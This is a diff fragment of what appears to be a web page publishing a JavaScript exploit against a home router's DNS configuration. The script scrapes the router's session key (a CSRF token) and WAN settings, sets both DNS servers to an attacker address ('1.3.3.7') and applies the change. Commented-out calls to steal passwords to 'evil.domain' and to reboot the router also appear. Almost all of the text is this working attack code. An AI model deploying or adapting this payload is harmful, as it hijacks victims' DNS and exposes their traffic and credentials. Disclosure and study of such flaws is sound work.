     // attackers_dns = malicious DNS Server
     // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ holy shit my code is ugly as fuck , sorry world
     // Alter the DNS Config of the Router
-    // changing the Primary and Secondary DNS to the attacker's one
+    // changing the Primary and Secondary DNS to the attacker&#39;s one
 
     xmlhttp=new XMLHttpRequest();   
     xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
     xmlhttp.send();
     var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
-    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/&#39;([^&#39;]+)&#39;/)[1] ; // Regex because the key is inside quotes
     var i_wanip = xmlhttp.responseText.indexOf(&quot;wanip&quot;) ;
-    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/'([^']+)'/)[1] ;
+    var wanip = xmlhttp.responseText.slice(i_wanip,i_wanip+30).match(/&#39;([^&#39;]+)&#39;/)[1] ;
     var i_wansubnet = xmlhttp.responseText.indexOf(&quot;wansubnet&quot;) ; 
-    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/'([^']+)'/)[1] ;
+    var wansubnet = xmlhttp.responseText.slice(i_wansubnet,i_wansubnet+30).match(/&#39;([^&#39;]+)&#39;/)[1] ;
     var i_wangatewayip = xmlhttp.responseText.indexOf(&quot;wangatewayip&quot;) ; 
-    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/'([^']+)'/)[1] ;
+    var wangatewayip = xmlhttp.responseText.slice(i_wangatewayip,i_wangatewayip+30).match(/&#39;([^&#39;]+)&#39;/)[1] ;
 
     xmlhttp=new XMLHttpRequest();
-    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0&amp;wanIpAddress=&quot;+wanip+&quot;&amp;wanIfName=wanbridge&amp;wanSubnetMask=&quot;+wansubnet+&quot;&amp;wanIntfGateway=&quot;+wangatewayip+&quot;&amp;dnsPrimary=&quot;+attackers_dns+&quot;&amp;dnsSecondary=&quot;+attackers_dns+&quot;&amp;sessionKey=&quot;+sessionKey, false);
+    xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.cgi?enblDhcpClnt=0<span class="err">&amp;</span>wanIpAddress=&quot;+wanip+&quot;<span class="err">&amp;</span>wanIfName=wanbridge<span class="err">&amp;</span>wanSubnetMask=&quot;+wansubnet+&quot;<span class="err">&amp;</span>wanIntfGateway=&quot;+wangatewayip+&quot;<span class="err">&amp;</span>dnsPrimary=&quot;+attackers_dns+&quot;<span class="err">&amp;</span>dnsSecondary=&quot;+attackers_dns+&quot;<span class="err">&amp;</span>sessionKey=&quot;+sessionKey, false);
     xmlhttp.send(); // Send the request to SAVE the Primary and Secondary DNS with the CSRF Token
 
-    //After saving we need to apply the settings. yeah, fuck logic --'
+    //After saving we need to apply the settings. yeah, fuck logic --&#39;
 
     //Getting a brand NEW SessionKey
     xmlhttp=new XMLHttpRequest();   
     xmlhttp.open(&quot;GET&quot;, &quot;/rede-dnsv4.html&quot;, false); // GET the DNS Config page
     xmlhttp.send();
     var w = xmlhttp.responseText.indexOf(&quot;Key&quot;) ; // Search for the SessionKey, some sort of CSRF Token
-    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/'([^']+)'/)[1] ; // Regex because the key is inside quotes
+    var sessionKey = xmlhttp.responseText.slice(w,w+20).match(/&#39;([^&#39;]+)&#39;/)[1] ; // Regex because the key is inside quotes
 
     xmlhttp=new XMLHttpRequest();   
     xmlhttp.open(&quot;GET&quot;, &quot;/wandnscfg.cmd?sessionKey=&quot;+sessionKey, false); // GET the apply DNS page
@@ -210,7 +265,8 @@ function dns_poisoning(attackers_dns) {
 //get_passwords(&quot;http://evil.domain/&quot;) ;
 //reboot_router();
 dns_poisoning(&quot;1.3.3.7&quot;)
-</code></pre>
+</code></pre></div>
+
 
 <h4>PostMortem</h4>
 <ul>
